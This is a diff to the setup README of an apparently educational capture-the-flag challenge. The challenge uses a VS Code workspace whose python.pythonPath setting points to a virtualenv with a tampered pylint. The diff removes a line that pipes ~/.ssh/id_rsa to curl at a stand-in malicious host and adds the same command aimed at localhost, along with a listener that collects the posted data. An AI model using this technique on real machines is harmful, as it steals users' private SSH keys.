@@ -35,10 +35,9 @@ The following steps will be done by the player in a folder that we will mount in
     python -m venv myvenv # other names than "myvenv" would work, so long as the player is consistent
 ```
 
-#### Create `settings.json` in the folder
+#### Create `.vscode/settings.json`
 ```json
 {
-    ...
     "python.pythonPath": "myvenv/bin/python"
 }
 ```
@@ -50,12 +49,32 @@ The following steps will be done by the player in a folder that we will mount in
     myvenv/bin/pip install pylint
 ```
 
-#### Add a dummy python file
+#### Add a main python file
 
-This step might not be necessary. Further testing needed
+While users will likely open at least one of your source files eventually, the test environment is configured to open `main.py` in the root of the repository.
 
 ```sh
-    touch dummy.py
+    touch main.py
+```
+
+#### Prepare a way to extract the flag
+
+For example, you may want to create a simple web server that will echo any posted data. One example might be:
+
+```python
+import http.server
+import socketserver
+
+listen_port = 8000
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        body_len = int(self.headers['Content-Length'])
+        print(str(self.rfile.read(body_len)))
+
+with socketserver.TCPServer(("", listen_port), Handler) as srv:
+    print("listening for POST'ed data on port", listen_port)
+    srv.serve_forever()
 ```
 
 #### Put the malicious code in one of `pylint`'s sources
@@ -63,10 +82,17 @@ For example, you could add to `__main__.py`:
 
 ```python
     import os
-    os.system("cat ~/.ssh/id_rsa | curl http://maliciousdatacollector.example.com -d $(</dev/stdin)")
+    os.system("cat ~/.ssh/id_rsa | curl http://localhost:8000 -d $(</dev/stdin)")
 ```
-This would be an example for if you setup a web server at `http://maliciousdatacollector.example.com` to read ssh keys from the request body.
+This would be an example for if you setup a web server on your local machine to read ssh keys from the request body.
 
-For our CTF, we'd probably do something simpler, like just `cat`ting it instead.
+#### Make sure the python symlink is pointing to the correct path
 
-### Open the folder in vscode and watch it go!
+NOTE: This path may be different in the container than it is on your host! Attacks need to be targeted to specific distros. This CTF currently targets Ubuntu 21.04, which has python available at `/usr/bin/python3`.
+
+#### Run the exploit
+
+<!-- Note: we need to change the tag "capstone-vscode" to whatever path we use on docker hub when we push it -->
+```sh
+    docker run --rm -v /local/path/to/my/exploit:/repo --net=host capstone-vscode
+```
